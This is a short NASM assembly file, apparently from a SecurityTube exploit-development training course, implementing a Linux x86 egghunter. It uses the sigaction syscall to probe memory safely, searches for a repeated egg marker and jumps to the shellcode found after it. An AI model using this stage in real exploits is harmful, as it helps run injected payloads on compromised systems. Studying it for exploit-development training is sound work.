; Filename: egghunter.nasm
; Author:  Rob W
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: Egghunter using Matt Miller's sigaction method

global _start			

section .text
_start:

align_page:

	or cx, 0xfff

next_address:

	inc ecx
	jnz not_null
	inc ecx

not_null:
	push byte +0x43
	pop eax
	int 0x80
	cmp al, 0xf2
	jz align_page
	mov eax, 0x50905090
	mov edi, ecx
	scasd
	jnz next_address
	scasd
	jnz next_address
	jmp edi
